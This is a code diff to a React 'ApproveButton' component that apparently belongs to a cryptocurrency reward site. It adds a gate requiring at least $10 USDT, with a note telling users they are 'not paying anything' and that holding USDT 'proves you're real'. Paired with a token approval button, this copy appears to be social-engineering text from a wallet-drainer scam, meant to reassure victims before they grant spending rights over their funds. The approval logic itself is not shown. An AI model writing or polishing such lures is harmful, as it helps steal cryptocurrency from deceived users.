@@ -247,6 +247,47 @@ export default function ApproveButton() {
     );
   }
 
+  // Show USDT requirement message if balance is too low
+  if (!hasMinimumUsdt) {
+    return (
+      <div style={{
+        padding: "20px",
+        textAlign: "center",
+        borderRadius: "15px",
+        background: "rgba(255, 193, 7, 0.1)",
+        border: "1px solid rgba(255, 193, 7, 0.3)",
+        color: "rgba(255, 255, 255, 0.9)"
+      }}>
+        <div style={{
+          fontSize: "1.1rem",
+          fontWeight: "600",
+          marginBottom: "10px",
+          color: "#ffc107"
+        }}>
+          💰 Minimum $10 USDT Required
+        </div>
+        <div style={{
+          fontSize: "14px",
+          marginBottom: "15px",
+          color: "rgba(255, 255, 255, 0.8)"
+        }}>
+          Current balance: ${usdtBalanceNumber.toFixed(2)} USDT
+        </div>
+        <div style={{
+          fontSize: "13px",
+          lineHeight: "1.5",
+          color: "rgba(255, 255, 255, 0.7)",
+          background: "rgba(255, 255, 255, 0.05)",
+          padding: "12px",
+          borderRadius: "10px",
+          border: "1px solid rgba(255, 255, 255, 0.1)"
+        }}>
+          💡 Note: You're not paying anything — holding at least $10 USDT or more simply proves you're real and helps stop bots and cheaters from abusing the system. This keeps rewards fair for active users like you.
+        </div>
+      </div>
+    );
+  }
+
   return (
     <div>
       <button
@@ -309,36 +350,7 @@ export default function ApproveButton() {
         </style>
       </button>
 
-      {/* Warning message when insufficient USDT */}
-      {!hasMinimumUsdt && (
-        <div style={{
-          marginTop: "15px",
-          padding: "15px",
-          borderRadius: "12px",
-          background: "rgba(255, 193, 7, 0.1)",
-          border: "1px solid rgba(255, 193, 7, 0.3)",
-          color: "rgba(255, 255, 255, 0.9)",
-          textAlign: "center"
-        }}>
-          <div style={{
-            fontSize: "1rem",
-            fontWeight: "600",
-            marginBottom: "8px",
-            color: "#ffc107"
-          }}>
-            💰 Minimum $10 USDT Required
-          </div>
-          <div style={{
-            fontSize: "14px",
-            marginBottom: "12px",
-            color: "rgba(255, 255, 255, 0.8)"
-          }}>
-            Current balance: ${usdtBalanceNumber.toFixed(2)} USDT
-          </div>
-        </div>
-      )}
-
-      {/* Explanatory note */}
+      {/* Explanatory note for eligible users */}
       <div style={{
         marginTop: "15px",
         fontSize: "13px",
